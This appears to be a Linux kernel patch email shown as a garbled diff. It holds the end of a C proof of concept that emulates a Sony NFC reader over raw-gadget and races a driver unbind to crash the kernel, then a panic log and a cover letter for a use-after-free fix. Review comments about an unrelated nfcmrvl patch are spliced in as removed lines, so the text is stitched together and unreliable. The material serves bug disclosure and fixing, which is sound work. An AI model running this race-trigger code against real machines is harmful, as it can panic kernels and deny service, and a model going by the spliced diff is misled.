+	out[3] = 0xff;
+	out[4] = 0xff;
+	out[5] = (uint8_t)(datalen & 0xff);
+	out[6] = (uint8_t)((datalen >> 8) & 0xff);
+	out[7] = (uint8_t)le16_checksum_rule(datalen);
+	out[8] = 0xd7;
+	out[9] = (uint8_t)(cmd + 1);
+	if (payload_len)
+		memcpy(&out[10], payload, payload_len);
+	dsum = sum_checksum_rule(&out[8], datalen);
+	out[8 + datalen] = dsum;
+	out[8 + datalen + 1] = 0x00;
+
+	return total;
+}
+
+static int send_port100_response(struct port100_ctx *ctx, uint8_t cmd,
+				 const uint8_t *payload, size_t payload_len)
+{
+	uint8_t frame[128];
+	size_t len;
+
+	len = build_port100_response(cmd, payload, payload_len, frame,
+				     sizeof(frame));
+	if (!len)
+		return -EINVAL;
+
+	return raw_ep_write(ctx->fd, ctx->ep_in, frame, (uint32_t)len);
+}
+
+static bool is_out_control_request(const struct usb_ctrlrequest *ctrl)
+{
+	return !(ctrl->bRequestType & USB_DIR_IN);
+}
+
+static void fill_string_desc(uint8_t idx, uint8_t *buf, uint16_t *len)
+{
+	static const uint8_t lang0[] = {0x04, USB_DT_STRING, 0x09, 0x04};
+	const char *s;
+	size_t i;
+	size_t n;
+
+	if (idx == 0) {
+		memcpy(buf, lang0, sizeof(lang0));
+		*len = sizeof(lang0);
+		return;
+	}
+
+	switch (idx) {
+	case 1:
+		s = "Sony";
+		break;
+	case 2:
+		s = "RC-S380";
+		break;
+	case 3:
+		s = "0001";
+		break;
+	default:
+		*len = 0;
+		return;
+	}
+
+	n = strlen(s);
+	buf[0] = (uint8_t)(2 + n * 2);
+	buf[1] = USB_DT_STRING;
+	for (i = 0; i < n; i++) {
+		buf[2 + i * 2] = (uint8_t)s[i];
+		buf[3 + i * 2] = 0;
+	}
+	*len = buf[0];
+}
+
+static int handle_control_event(struct port100_ctx *ctx,
+				const struct usb_ctrlrequest *ctrl)
+{
+	uint16_t w_value = le16toh(ctrl->wValue);
+	uint16_t w_index = le16toh(ctrl->wIndex);
+	uint16_t w_length = le16toh(ctrl->wLength);
+	uint8_t desc_type = (uint8_t)(w_value >> 8);
+	uint8_t desc_idx = (uint8_t)(w_value & 0xff);
+	uint8_t resp[256];
+	uint16_t resp_len = 0;
+	int rv;
+
+	static const struct usb_device_descriptor dev_desc = {
+		.bLength = sizeof(struct usb_device_descriptor),
+		.bDescriptorType = USB_DT_DEVICE,
+		.bcdUSB = 0x0200,
+		.bDeviceClass = 0,
+		.bDeviceSubClass = 0,
+		.bDeviceProtocol = 0,
+		.bMaxPacketSize0 = 64,
+		.idVendor = 0x054c,
+		.idProduct = 0x06c1,
+		.bcdDevice = 0x0001,
+		.iManufacturer = 1,
+		.iProduct = 2,
+		.iSerialNumber = 3,
+		.bNumConfigurations = 1,
+	};
+
+	struct {
+		struct usb_config_descriptor config;
+		struct usb_interface_descriptor intf;
+		struct usb_endpoint_descriptor ep_out;
+		struct usb_endpoint_descriptor ep_in;
+	} __attribute__((packed)) cfg_desc = {
+		.config = {
+			.bLength = sizeof(struct usb_config_descriptor),
+			.bDescriptorType = USB_DT_CONFIG,
+			.wTotalLength = sizeof(cfg_desc),
+			.bNumInterfaces = 1,
+			.bConfigurationValue = 1,
+			.iConfiguration = 0,
+			.bmAttributes = USB_CONFIG_ATT_ONE,
+			.bMaxPower = 50,
+		},
+		.intf = {
+			.bLength = sizeof(struct usb_interface_descriptor),
+			.bDescriptorType = USB_DT_INTERFACE,
+			.bInterfaceNumber = 0,
+			.bAlternateSetting = 0,
+			.bNumEndpoints = 2,
+			.bInterfaceClass = USB_CLASS_VENDOR_SPEC,
+			.bInterfaceSubClass = 0,
+			.bInterfaceProtocol = 0,
+			.iInterface = 0,
+		},
+		.ep_out = {
+			.bLength = sizeof(struct usb_endpoint_descriptor),
+			.bDescriptorType = USB_DT_ENDPOINT,
+			.bEndpointAddress = 0x02,
+			.bmAttributes = USB_ENDPOINT_XFER_BULK,
+			.wMaxPacketSize = 512,
+			.bInterval = 0,
+		},
+		.ep_in = {
+			.bLength = sizeof(struct usb_endpoint_descriptor),
+			.bDescriptorType = USB_DT_ENDPOINT,
+			.bEndpointAddress = 0x81,
+			.bmAttributes = USB_ENDPOINT_XFER_BULK,
+			.wMaxPacketSize = 512,
+			.bInterval = 0,
+		},
+	};
+
+	if ((ctrl->bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
+		switch (ctrl->bRequest) {
+		case USB_REQ_GET_DESCRIPTOR:
+			switch (desc_type) {
+			case USB_DT_DEVICE:
+				memcpy(resp, &dev_desc, sizeof(dev_desc));
+				resp_len = sizeof(dev_desc);
+				break;
+			case USB_DT_CONFIG:
+				memcpy(resp, &cfg_desc, sizeof(cfg_desc));
+				resp_len = sizeof(cfg_desc);
+				break;
+			case USB_DT_STRING:
+				fill_string_desc(desc_idx, resp, &resp_len);
+				break;
+			default:
+				resp_len = 0;
+				break;
+			}
+			break;
+		case USB_REQ_SET_CONFIGURATION:
+			if (w_value == 1 && !ctx->configured) {
+				struct usb_endpoint_descriptor ep;
+				uint32_t power = 250;
+
+				ioctl(ctx->fd, USB_RAW_IOCTL_VBUS_DRAW, power);
+				ioctl(ctx->fd, USB_RAW_IOCTL_CONFIGURE, 0);
+
+				memset(&ep, 0, sizeof(ep));
+				ep.bLength = sizeof(ep);
+				ep.bDescriptorType = USB_DT_ENDPOINT;
+				ep.bEndpointAddress = 0x81;
+				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+				ep.wMaxPacketSize = htole16(512);
+				ctx->ep_in = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);
+
+				memset(&ep, 0, sizeof(ep));
+				ep.bLength = sizeof(ep);
+				ep.bDescriptorType = USB_DT_ENDPOINT;
+				ep.bEndpointAddress = 0x02;
+				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+				ep.wMaxPacketSize = htole16(512);
+				ctx->ep_out = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);
+
+				if (ctx->ep_in >= 0 && ctx->ep_out >= 0)
+					ctx->configured = true;
+			}
+			break;
+		case USB_REQ_GET_INTERFACE:
+			resp[0] = 0;
+			resp_len = 1;
+			break;
+		case USB_REQ_SET_INTERFACE:
+			break;
+		default:
+			break;
+		}
+	}
+
+	if (is_out_control_request(ctrl))
+		rv = raw_ep0_read(ctx->fd, w_length);
+	else {
+		if (resp_len > w_length)
+			resp_len = w_length;
+		rv = raw_ep0_write(ctx->fd, resp, resp_len);
+	}
+
+	(void)w_index;
+	return rv;
+}
+
+static void *bulk_thread_fn(void *arg)
+{
+	struct port100_ctx *ctx = arg;
+	uint8_t inbuf[USB_MAX_PACKET_SIZE];
+	uint8_t payload[16];
+
+	while (ctx->running) {
+		uint32_t len = sizeof(inbuf);
+		int rv;
+		uint8_t cmd;
+
+		rv = raw_ep_read(ctx->fd, ctx->ep_out, inbuf, &len);
+		if (rv < 0) {
+			if (ctx->running)
+				fprintf(stderr, "ep_read failed: %d (%s)\n", errno,
+					strerror(errno));
+			break;
+		}
+
+		if (len < 10)
+			continue;
+		cmd = inbuf[9];
+		fprintf(stderr, "[usb] cmd 0x%02x len=%u\n", cmd, len);
+
+		if (cmd == 0x04) {
+			pthread_mutex_lock(&ctx->lock);
+			ctx->saw_in_comm_rf = true;
+			pthread_cond_broadcast(&ctx->cond);
+			pthread_mutex_unlock(&ctx->lock);
+			fprintf(stderr, "[usb] saw IN_COMM_RF, withholding ack/resp\n");
+			continue;
+		}
+
+		if (send_ack(ctx) < 0) {
+			fprintf(stderr, "send_ack failed: %s\n", strerror(errno));
+			break;
+		}
+
+		switch (cmd) {
+		case 0x28: {
+			uint64_t mask = htobe64(0x3);
+			if (send_port100_response(ctx, cmd, (const uint8_t *)&mask,
+						 sizeof(mask)) < 0)
+				goto out;
+			break;
+		}
+		case 0x20: {
+			uint16_t fw = htole16(0x0101);
+			if (send_port100_response(ctx, cmd, (const uint8_t *)&fw,
+						 sizeof(fw)) < 0)
+				goto out;
+			break;
+		}
+		default:
+			payload[0] = 0x00;
+			if (send_port100_response(ctx, cmd, payload, 1) < 0)
+				goto out;
+			break;
+		}
+	}
+
+out:
+	return NULL;
+}
+
+static int choose_udc(char *out, size_t out_sz)
+{
+	DIR *d;
+	struct dirent *de;
+
+	d = opendir("/sys/class/udc");
+	if (!d)
+		return -1;
+
+	while ((de = readdir(d)) != NULL) {
+		if (de->d_name[0] == '.')
+			continue;
+		if (strncmp(de->d_name, "dummy_udc.", 10) == 0) {
+			snprintf(out, out_sz, "%s", de->d_name);
+			closedir(d);
+			return 0;
+		}
+	}
+
+	closedir(d);
+	return -1;
+}
+
+static int setup_raw_gadget(struct port100_ctx *ctx)
+{
+	struct usb_raw_init arg;
+	char udc_name[128] = {0};
+	int rv;
+
+	ctx->fd = open("/dev/raw-gadget", O_RDWR);
+	if (ctx->fd < 0)
+		return -1;
+
+	if (choose_udc(udc_name, sizeof(udc_name)) < 0)
+		snprintf(udc_name, sizeof(udc_name), "dummy_udc.0");
+
+	memset(&arg, 0, sizeof(arg));
+	strncpy((char *)arg.driver_name, "dummy_udc", sizeof(arg.driver_name) - 1);
+	strncpy((char *)arg.device_name, udc_name, sizeof(arg.device_name) - 1);
+	arg.speed = USB_SPEED_HIGH;
+
+	rv = ioctl(ctx->fd, USB_RAW_IOCTL_INIT, &arg);
+	if (rv < 0)
+		return -1;
+	rv = ioctl(ctx->fd, USB_RAW_IOCTL_RUN, 0);
+	if (rv < 0)
+		return -1;
+
+	fprintf(stderr, "raw gadget running on %s\n", udc_name);
+	return 0;
+}
+
+static int wait_until_configured(struct port100_ctx *ctx, int timeout_sec)
+{
+	struct timespec start;
+
+	clock_gettime(CLOCK_MONOTONIC, &start);
+
+	while (!ctx->configured) {
+		struct usb_raw_control_event event;
+		struct timespec now;
+		int elapsed;
+		int rv;
+
+		memset(&event, 0, sizeof(event));
+		event.inner.length = sizeof(event.ctrl) + sizeof(event.data);
+		rv = ioctl(ctx->fd, USB_RAW_IOCTL_EVENT_FETCH, &event);
+		if (rv < 0)
+			return -1;
+
+		if (event.inner.type != USB_RAW_EVENT_CONTROL)
+			continue;
+
+		if (handle_control_event(ctx, &event.ctrl) < 0)
+			return -1;
+
+		clock_gettime(CLOCK_MONOTONIC, &now);
+		elapsed = (int)(now.tv_sec - start.tv_sec);
+		if (elapsed > timeout_sec)
+			return -1;
+	}
+
+	fprintf(stderr, "raw gadget configured: ep_in=%d ep_out=%d\n",
+		ctx->ep_in, ctx->ep_out);
+	return 0;
+}
+
+static int scan_nfc_indices(int *out, int max)
+{
+	DIR *d;
+	struct dirent *de;
+	int n = 0;
+
+	d = opendir("/sys/class/nfc");
+	if (!d)
+		return 0;
+
+	while ((de = readdir(d)) != NULL) {
+		if (strncmp(de->d_name, "nfc", 3) != 0)
+			continue;
+		if (n < max)
+			out[n++] = atoi(de->d_name + 3);
+	}
+
+	closedir(d);
+	return n;
+}
+
+static int wait_new_nfc_index(int baseline_max, int timeout_sec)
+{
+	int i;
+	for (i = 0; i < timeout_sec * 20; i++) {
+		int idx[64];
+		int n = scan_nfc_indices(idx, ARRAY_SIZE(idx));
+		int j;
+
+		for (j = 0; j < n; j++) {
+			if (idx[j] > baseline_max)
+				return idx[j];
+		}
+		usleep(50000);
+	}
+	return -1;
+}
+
+static int find_port100_iface(char *out, size_t out_sz)
+{
+	DIR *d;
+	struct dirent *de;
+
+	d = opendir("/sys/bus/usb/drivers/port100");
+	if (!d)
+		return -1;
+
+	while ((de = readdir(d)) != NULL) {
+		if (de->d_name[0] == '.')
+			continue;
+		if (!strchr(de->d_name, ':'))
+			continue;
+		snprintf(out, out_sz, "%s", de->d_name);
+		closedir(d);
 		return 0;
 	}
 
-With the flag cleared, A's frames are dropped and A stalls until the
-timeout. On UART, nfcmrvl_nci_uart_tx_start() and
-nfcmrvl_nci_uart_tx_done() also stop skipping the BREAK handling partway
-through the download.
-
-nfc_dev_up() rejects only on fw_download_in_progress, so the NCI device
-can be brought up while A is still active. Later, A's timeout_work reaches
-fw_dnld_over() and does two things to the running device:
-
-  - fw_dnld_stop_cmds() sets cmd_cnt to 0, cancels cmd_work and purges
-    cmd_q.
-  - nfcmrvl_chip_halt() asserts reset underneath it.
-
-Before this patch the second request returned 0 and the flag stayed set.
-
-[ ... ]
-
-> @@ -546,8 +645,24 @@ int nfcmrvl_fw_dnld_start(struct nci_dev *ndev, const char *firmware_name)
->  
->  	/* First, reset the chip */
->  	priv->fw_dnld.state = STATE_RESET;
-> +
-> +	spin_lock_irqsave(&fw_dnld->rx_lock, flags);
-> +	fw_dnld->active = true;
-> +	fw_dnld->starting = true;
-> +	spin_unlock_irqrestore(&fw_dnld->rx_lock, flags);
-> +
->  	nfcmrvl_chip_reset(priv);
->  
-> +	spin_lock_irqsave(&fw_dnld->rx_lock, flags);
-> +	fw_dnld->starting = false;
-> +	if (fw_dnld->active) {
-> +		mod_timer(&fw_dnld->timer,
-> +			  jiffies + msecs_to_jiffies(FW_DNLD_TIMEOUT));
-> +		if (!skb_queue_empty(&fw_dnld->rx_q))
-> +			queue_work(fw_dnld->rx_wq, &fw_dnld->rx_work);
-> +	}
-> +	spin_unlock_irqrestore(&fw_dnld->rx_lock, flags);
-
-[Severity: Low]
-This is a pre-existing issue, but should frames that arrive while reset is
-asserted go to the STATE_RESET handler at all?
-
-nfcmrvl_fw_dnld_recv_frame() keeps frames that arrive during the pulse in
-nfcmrvl_chip_reset() in rx_q, and they are processed here once the pulse
-ends. A frame received while reset is held is unlikely to be the
-post-reset CORE_RESET_NTF. If it doesn't match, process_state_reset()
-returns -EINVAL and fw_dnld_over() halts the chip.
-
-Before this patch, the same frames were processed in STATE_RESET straight
-away. Purging them may not be right either: the real CORE_RESET_NTF could
-arrive between the reset deassert and the spin_lock_irqsave() above.
-
-[ ... ]
-
-> diff --git a/drivers/nfc/nfcmrvl/main.c b/drivers/nfc/nfcmrvl/main.c
-> index 81c760534cf68..02ea3356b2abb 100644
-> --- a/drivers/nfc/nfcmrvl/main.c
-> +++ b/drivers/nfc/nfcmrvl/main.c
-> @@ -185,13 +185,12 @@ void nfcmrvl_nci_unregister_dev(struct nfcmrvl_private *priv)
->  {
->  	struct nci_dev *ndev = priv->ndev;
->  
-> +	nfcmrvl_fw_dnld_abort(priv);
->  	nci_unregister_device(ndev);
-> +
->  	if (priv->if_ops->nci_quiesce)
->  		priv->if_ops->nci_quiesce(priv);
->  
-> -	if (priv->ndev->nfc_dev->fw_download_in_progress)
-> -		nfcmrvl_fw_dnld_abort(priv);
-> -
->  	nfcmrvl_fw_dnld_deinit(priv);
-
-[Severity: Low]
-This isn't a bug, but nfcmrvl_fw_dnld_abort() now runs unconditionally
-here, and nfcmrvl_fw_dnld_deinit() calls it a second time a few lines
-later:
-
-void nfcmrvl_fw_dnld_deinit(struct nfcmrvl_private *priv)
-{
-	nfcmrvl_fw_dnld_abort(priv);
-	destroy_workqueue(priv->fw_dnld.rx_wq);
+	closedir(d);
+	return -1;
 }
 
-The deinit call also runs on the nfcmrvl_nci_register_dev() error path,
-where no download was ever started. Are both calls needed?
+static int unbind_port100(void)
+{
+	char iface[128];
+	int fd;
+	size_t len;
 
-The commit message also doesn't mention two other changes in this patch:
+	if (find_port100_iface(iface, sizeof(iface)) < 0)
+		return -1;
 
-  - fw_dnld_rx_work() no longer drains rx_q in a loop. It processes one
-    skb per run and requeues itself.
-  - The bad magic/phy path in nfcmrvl_fw_dnld_start() now also clears
-    fw_dnld->fw.
+	fd = open("/sys/bus/usb/drivers/port100/unbind", O_WRONLY);
+	if (fd < 0)
+		return -1;
 
-The message does describe these changes, which land in the same patch:
+	len = strlen(iface);
+	if (write(fd, iface, len) != (ssize_t)len) {
+		close(fd);
+		return -1;
+	}
 
-  - a positive errno in the download status userspace sees
-  - -EBUSY for a second download
-  - holding frames during the reset pulse
-  - moving timeout completion to a workqueue
+	close(fd);
+	return 0;
+}
 
-That is a lot of behaviour change in one Fixes-tagged patch. Could some of
-it be split out so the teardown fix can be reviewed and backported on its
-own?
+static int set_thread_realtime(int prio)
+{
+	struct sched_param sp;
+
+	memset(&sp, 0, sizeof(sp));
+	sp.sched_priority = prio;
+	return sched_setscheduler(0, SCHED_FIFO, &sp);
+}
+
+static void *hog_thread_fn(void *arg)
+{
+	struct hog_ctx *hog = arg;
+	cpu_set_t cpus;
+	struct sched_param sp;
+
+	CPU_ZERO(&cpus);
+	CPU_SET(hog->cpu, &cpus);
+	pthread_setaffinity_np(pthread_self(), sizeof(cpus), &cpus);
+
+	memset(&sp, 0, sizeof(sp));
+	sp.sched_priority = 90;
+	pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
+
+	while (hog->run)
+		asm volatile("" : : : "memory");
+
+	return NULL;
+}
+
+static int nl_sock_open(uint32_t *seq_out)
+{
+	struct sockaddr_nl addr;
+	int fd;
+
+	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (fd < 0)
+		return -1;
+
+	memset(&addr, 0, sizeof(addr));
+	addr.nl_family = AF_NETLINK;
+	addr.nl_pid = (uint32_t)getpid();
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		close(fd);
+		return -1;
+	}
+
+	*seq_out = 1;
+	return fd;
+}
+
+static int nla_put(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
+		   const void *data, uint16_t len)
+{
+	size_t offset;
+	size_t attr_len;
+	size_t total_len;
+	struct nlattr *attr;
+
+	offset = NLMSG_ALIGN(nlh->nlmsg_len);
+	attr_len = sizeof(struct nlattr) + len;
+	total_len = offset + NLA_ALIGN(attr_len);
+	if (total_len > maxlen)
+		return -1;
+
+	attr = (struct nlattr *)((uint8_t *)nlh + offset);
+	attr->nla_type = type;
+	attr->nla_len = attr_len;
+	memcpy((uint8_t *)attr + sizeof(struct nlattr), data, len);
+	memset((uint8_t *)attr + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);
+
+	nlh->nlmsg_len = total_len;
+	return 0;
+}
+
+static int nl_send_recv_ack(int fd, struct nlmsghdr *nlh)
+{
+	struct sockaddr_nl nladdr;
+	uint8_t buf[8192];
+	struct iovec iov;
+	struct msghdr msg;
+	uint32_t seq = nlh->nlmsg_seq;
+
+	memset(&nladdr, 0, sizeof(nladdr));
+	nladdr.nl_family = AF_NETLINK;
+
+	iov.iov_base = nlh;
+	iov.iov_len = nlh->nlmsg_len;
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_name = &nladdr;
+	msg.msg_namelen = sizeof(nladdr);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		ssize_t ret;
+		struct nlmsghdr *h;
+
+		ret = recv(fd, buf, sizeof(buf), 0);
+		if (ret < 0)
+			return -1;
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
+		     h = NLMSG_NEXT(h, ret)) {
+			if (h->nlmsg_seq != seq)
+				continue;
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
+				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err)))
+					return -1;
+				if (err->error) {
+					errno = -err->error;
+					return -1;
+				}
+				return 0;
+			}
+		}
+	}
+}
+
+static int genl_get_family_id(int fd, uint32_t *seq_io, const char *name)
+{
+	uint8_t buf[8192];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *ghdr;
+	struct sockaddr_nl nladdr;
+	struct iovec iov;
+	struct msghdr msg;
+	uint32_t seq = (*seq_io)++;
+
+	memset(buf, 0, sizeof(buf));
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
+	nlh->nlmsg_type = GENL_ID_CTRL;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = seq;
+	nlh->nlmsg_pid = (uint32_t)getpid();
+
+	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
+	ghdr->cmd = CTRL_CMD_GETFAMILY;
+	ghdr->version = 1;
+	ghdr->reserved = 0;
+
+	if (nla_put(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name,
+		    (uint16_t)strlen(name) + 1) < 0)
+		return -1;
+
+	memset(&nladdr, 0, sizeof(nladdr));
+	nladdr.nl_family = AF_NETLINK;
+	memset(&msg, 0, sizeof(msg));
+	iov.iov_base = nlh;
+	iov.iov_len = nlh->nlmsg_len;
+	msg.msg_name = &nladdr;
+	msg.msg_namelen = sizeof(nladdr);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		ssize_t ret = recv(fd, buf, sizeof(buf), 0);
+		struct nlmsghdr *h;
+		if (ret < 0)
+			return -1;
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
+		     h = NLMSG_NEXT(h, ret)) {
+			if (h->nlmsg_seq != seq)
+				continue;
+
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
+				if (err->error) {
+					errno = -err->error;
+					return -1;
+				}
+				return -1;
+			}
+
+			if (h->nlmsg_type == GENL_ID_CTRL) {
+				struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(h);
+				int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
+				struct nlattr *attr = (struct nlattr *)((uint8_t *)gh +
+							       sizeof(*gh));
+				for (; rem >= (int)sizeof(*attr);
+				     attr = (struct nlattr *)((uint8_t *)attr +
+							NLA_ALIGN(attr->nla_len))) {
+					if (attr->nla_len < sizeof(*attr) || attr->nla_len > rem)
+						break;
+					if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
+						uint16_t id;
+						memcpy(&id,
+						       (uint8_t *)attr + sizeof(*attr),
+						       sizeof(id));
+						/* consume pending ACK */
+						nl_send_recv_ack(fd, nlh);
+						return id;
+					}
+					rem -= NLA_ALIGN(attr->nla_len);
+				}
+			}
+		}
+	}
+}
+
+static int nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
+			       uint8_t cmd, uint32_t dev_idx,
+			       bool include_im_proto, uint32_t im_proto)
+{
+	uint8_t buf[1024];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *gh;
+	uint32_t seq = (*seq_io)++;
+
+	memset(buf, 0, sizeof(buf));
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
+	nlh->nlmsg_type = fam_id;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = seq;
+	nlh->nlmsg_pid = (uint32_t)getpid();
+
+	gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
+	gh->cmd = cmd;
+	gh->version = NFC_GENL_VERSION;
+	gh->reserved = 0;
+
+	if (nla_put(nlh, sizeof(buf), NFC_ATTR_DEVICE_INDEX, &dev_idx,
+		    sizeof(dev_idx)) < 0)
+		return -1;
+
+	if (include_im_proto) {
+		if (nla_put(nlh, sizeof(buf), NFC_ATTR_IM_PROTOCOLS, &im_proto,
+			    sizeof(im_proto)) < 0)
+			return -1;
+	}
+
+	return nl_send_recv_ack(fd, nlh);
+}
+
+static int retry_nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
+				     uint8_t cmd, uint32_t dev_idx,
+				     bool include_im_proto, uint32_t im_proto,
+				     int attempts, int delay_ms)
+{
+	int i;
+	int rc;
+	int saved_errno = 0;
+
+	for (i = 0; i < attempts; i++) {
+		rc = nfc_genl_simple_cmd(fd, seq_io, fam_id, cmd, dev_idx,
+					 include_im_proto, im_proto);
+		if (!rc)
+			return 0;
+
+		saved_errno = errno;
+
+		if (i + 1 < attempts)
+			usleep((useconds_t)delay_ms * 1000);
+	}
+
+	errno = saved_errno ? saved_errno : EIO;
+	return -1;
+}
+
+int main(void)
+{
+	struct port100_ctx ctx;
+	pthread_t bulk_thr;
+	pthread_t hog_thr[8];
+	struct hog_ctx hogs[8];
+	int hog_count = 0;
+	int baseline[32];
+	int baseline_n;
+	int baseline_max = -1;
+	int port100_idx;
+	uint32_t nlseq = 1;
+	int nlfd = -1;
+	int fam_id;
+	int i;
+
+	memset(&ctx, 0, sizeof(ctx));
+	ctx.fd = -1;
+	ctx.ep_in = -1;
+	ctx.ep_out = -1;
+	ctx.running = true;
+	pthread_mutex_init(&ctx.lock, NULL);
+	pthread_cond_init(&ctx.cond, NULL);
+
+	baseline_n = scan_nfc_indices(baseline, ARRAY_SIZE(baseline));
+	for (i = 0; i < baseline_n; i++) {
+		if (baseline[i] > baseline_max)
+			baseline_max = baseline[i];
+	}
+	fprintf(stderr, "baseline nfc max idx=%d\n", baseline_max);
+
+	if (setup_raw_gadget(&ctx) < 0) {
+		perror("setup_raw_gadget");
+		return 1;
+	}
+
+	if (wait_until_configured(&ctx, 15) < 0) {
+		perror("wait_until_configured");
+		return 1;
+	}
+
+	if (pthread_create(&bulk_thr, NULL, bulk_thread_fn, &ctx) != 0) {
+		perror("pthread_create");
+		return 1;
+	}
+
+	port100_idx = wait_new_nfc_index(baseline_max, 15);
+	if (port100_idx < 0) {
+		fprintf(stderr, "failed to find new nfc device index\n");
+		goto out;
+	}
+	fprintf(stderr, "port100 nfc index = %d\n", port100_idx);
+
+	nlfd = nl_sock_open(&nlseq);
+	if (nlfd < 0) {
+		perror("nl_sock_open");
+		goto out;
+	}
+
+	fam_id = genl_get_family_id(nlfd, &nlseq, NFC_GENL_NAME);
+	if (fam_id < 0) {
+		perror("genl_get_family_id");
+		goto out;
+	}
+	fprintf(stderr, "nfc genl family id = %d\n", fam_id);
+
+	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id, NFC_CMD_DEV_UP,
+				      port100_idx, false, 0, 60, 100) < 0)
+		perror("NFC_CMD_DEV_UP");
+	else
+		fprintf(stderr, "NFC_CMD_DEV_UP ok\n");
+
+	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id,
+				      NFC_CMD_START_POLL, port100_idx,
+				      true, NFC_PROTO_JEWEL_MASK, 60, 100) < 0)
+		perror("NFC_CMD_START_POLL");
+	else
+		fprintf(stderr, "NFC_CMD_START_POLL ok\n");
+
+	pthread_mutex_lock(&ctx.lock);
+	if (!ctx.saw_in_comm_rf) {
+		struct timespec ts;
+		clock_gettime(CLOCK_REALTIME, &ts);
+		ts.tv_sec += 10;
+		pthread_cond_timedwait(&ctx.cond, &ctx.lock, &ts);
+	}
+	pthread_mutex_unlock(&ctx.lock);
+
+	if (!ctx.saw_in_comm_rf) {
+		fprintf(stderr, "did not observe IN_COMM_RF command\n");
+		goto out;
+	}
+
+	fprintf(stderr, "trigger point reached, unbinding port100\n");
+
+	for (i = 0; i < 2 && i < (int)ARRAY_SIZE(hogs); i++) {
+		hogs[i].run = true;
+		hogs[i].cpu = i;
+		if (pthread_create(&hog_thr[i], NULL, hog_thread_fn, &hogs[i]) == 0)
+			hog_count++;
+	}
+
+	set_thread_realtime(95);
+
+	if (unbind_port100() < 0)
+		perror("unbind_port100");
+	else
+		fprintf(stderr, "unbind requested\n");
+
+	/* give kernel some time to run disconnect path */
+	sleep(2);
+
+out:
+	for (i = 0; i < hog_count; i++)
+		hogs[i].run = false;
+	for (i = 0; i < hog_count; i++)
+		pthread_join(hog_thr[i], NULL);
+
+	ctx.running = false;
+	if (ctx.fd >= 0)
+		close(ctx.fd);
+	if (nlfd >= 0)
+		close(nlfd);
+	pthread_cancel(bulk_thr);
+	pthread_join(bulk_thr, NULL);
+	fprintf(stderr, "done\n");
+	return 0;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+[  146.906029][    T8] usb 3-1: new high-speed USB device number 2 using dummy_hcd
+[  147.096700][    T8] usb 3-1: New USB device found, idVendor=054c, idProduct=06c1, bcdDevice= 0.01
+[  147.128607][    T8] port100 3-1:1.0: NFC: Sony NFC Port-100 Series attached (firmware v1.01)
+[  147.257864][    C1] port100 3-1:1.0: NFC: Urb failure (status -108)
+[  147.264911][ T9678] port100 3-1:1.0: NFC: A command is still in process
+[  147.266168][ T9678] port100 3-1:1.0: NFC: Sony Port-100 NFC device disconnected
+[  147.267189][ T9678] ------------[ cut here ]------------
+[  147.267880][ T9678] ODEBUG: free active (active state 0) object: ffff88801fdc50e8 object type: work_struct hint: port100_wq_cmd_complete+0x0/0x330
+[  147.270533][ T9678] WARNING: CPU: 1 PID: 9678 at lib/debugobjects.c:515 debug_print_object+0x19e/0x2a0
+[  147.272216][ T9678] CPU: 1 PID: 9678 Comm: poc Not tainted 6.6.113-gae5e8e39e063 #2
+[  147.295908][ T9678]  device_unbind_cleanup+0x19/0x1b0
+[  147.296551][ T9678]  device_release_driver_internal+0x4bf/0x610
+[  147.297317][ T9678]  unbind_store+0xf2/0x110
+[  147.317382][ T9678] Kernel panic - not syncing: kernel: panic_on_warn set ...
+[  147.372780][ T9678] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (1):
+  nfc: digital: fix use-after-free in unregister
+
+ drivers/nfc/nfcsim.c      |  8 +++++++-
+ drivers/nfc/port100.c     |  7 +++++++
+ drivers/nfc/st95hf/core.c | 13 ++++++++++---
+ drivers/nfc/trf7970a.c    | 11 +++++++++++
+ include/net/nfc/digital.h |  6 +++++-
+ net/nfc/core.c            |  4 ++--
+ net/nfc/digital_core.c    | 33 ++++++++++++++++++++++++++++++++-
